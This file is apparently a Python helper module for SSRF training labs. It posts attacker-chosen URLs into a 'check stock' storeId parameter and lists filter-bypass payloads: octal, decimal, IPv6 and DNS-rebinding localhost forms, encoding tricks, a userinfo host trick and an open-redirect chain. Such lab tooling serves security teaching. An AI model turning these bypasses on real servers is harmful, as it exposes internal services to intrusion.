"""
utils.py — shared helpers for the SSRF module labs.

📝 Note: fully request-driven like XXE — every lab here is scriptable
end-to-end with `requests`. The main variation between labs is WHICH
parameter carries the SSRF and what bypass trick gets the filtered target
past whatever validation sits in front of it.
"""

from proxies import BURP_PROXIES, VERIFY_SSL
import requests


def get_session():
    s = requests.Session()
    s.proxies.update(BURP_PROXIES)
    s.verify = VERIFY_SSL
    return s


def log(msg, ok=True):
    prefix = "[+]" if ok else "[-]"
    print(f"{prefix} {msg}")


def note(msg):
    """📝 Educational aside — prints a short explainer inline with exploit output."""
    print(f"📝 {msg}")


def stock_check(session, target, product_id, store_id_url):
    """
    The recurring vulnerable pattern across this module: a "check stock"
    feature where storeId is actually a URL fetched server-side to query a
    partner/internal stock API.
    """
    r = session.post(
        f"{target}/product/stock",
        data={"productId": product_id, "storeId": store_id_url},
    )
    return r


# ---- Filter-bypass helpers --------------------------------------------

def localhost_variants():
    """
    Alternate representations of 127.0.0.1 that sometimes slip past a naive
    string-match blacklist (e.g. one that just checks for the literal
    substring "localhost" or "127.0.0.1").
    """
    return [
        "127.0.0.1",
        "localhost",
        "0.0.0.0",
        "0177.0.0.1",        # octal
        "2130706433",        # decimal IP
        "127.1",             # shorthand
        "[::1]",              # IPv6 loopback
        "127.0.0.1.nip.io",  # resolves to 127.0.0.1 via DNS
    ]


def case_and_encoding_variants(hostname_fragment):
    """Mixed-case / URL-encoded tricks against naive substring blacklists."""
    return [
        hostname_fragment.upper(),
        hostname_fragment.replace(".", "%2e"),
        f"{hostname_fragment}#",
        f"{hostname_fragment}@evil-but-allowed-host.com",  # userinfo trick, parser-dependent
    ]


def build_open_redirect_chain(client_app, open_redirect_path, internal_target):
    """
    For the 'filter bypass via open redirection' lab: the storeId filter
    only allows the app's own trusted hostname, but that trusted app itself
    has an open redirect we can chain through.
    """
    return f"{client_app}{open_redirect_path}?path={internal_target}"
